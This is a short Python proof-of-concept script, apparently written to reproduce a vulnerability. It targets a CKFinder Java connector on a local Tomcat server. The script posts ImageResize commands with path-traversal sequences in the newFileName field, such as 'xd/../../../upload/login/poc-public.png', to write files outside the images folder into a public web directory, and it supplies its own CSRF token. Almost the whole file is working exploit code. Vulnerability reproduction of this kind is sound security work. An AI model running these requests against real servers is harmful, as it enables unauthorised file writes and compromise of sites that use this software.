#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""复刻 T1 并打印完整响应（含错误消息文本）。"""
import os
import re
import urllib.error
import urllib.parse
import urllib.request

TOKEN = "0123456789abcdef0123456789abcdef01234567"
BASE = "http://127.0.0.1:8080"
EP = BASE + "/ckfinder/core/connector/java/connector.java"
IMAGES_ROOT = "/opt/tomcat/webapps/ROOT/Resources/userfiles/images"
PUBLIC_LOGIN = "/opt/tomcat/webapps/ROOT/upload/login"


def post(fields):
    payload = dict(fields)
    payload.setdefault("CKFinderCommand", "true")
    body = urllib.parse.urlencode(payload).encode()
    req = urllib.request.Request(EP, data=body, method="POST")
    req.add_header("Cookie", "ckCsrfToken=" + TOKEN)
    req.add_header("Content-Type", "application/x-www-form-urlencoded")
    try:
        with urllib.request.urlopen(req, timeout=20) as r:
            return r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.read().decode("utf-8", "replace")


print("XD 目录存在: %s" % os.path.isdir(os.path.join(IMAGES_ROOT, "xd")))
print("images 目录内容: %s" % sorted(os.listdir(IMAGES_ROOT))[:12])
print("upload/login 存在: %s" % os.path.isdir(PUBLIC_LOGIN))
print()

src = "src_t1.png"
print("源图存在: %s" % os.path.isfile(os.path.join(IMAGES_ROOT, src)))
print()

for tgt in ("xd/../../../upload/login/poc-public.png",
            "xd/../../upload/login/poc-public.png",
            "xd/../../../upload/login/x2.png"):
    out = post({"command": "ImageResize", "type": "Images", "currentFolder": "/",
                "fileName": src, "newFileName": tgt, "width": "10", "height": "10",
                "overwrite": "1", "ckCsrfToken": TOKEN})
    print("tgt=%-46s" % tgt)
    print("   " + out[:400])
    print()
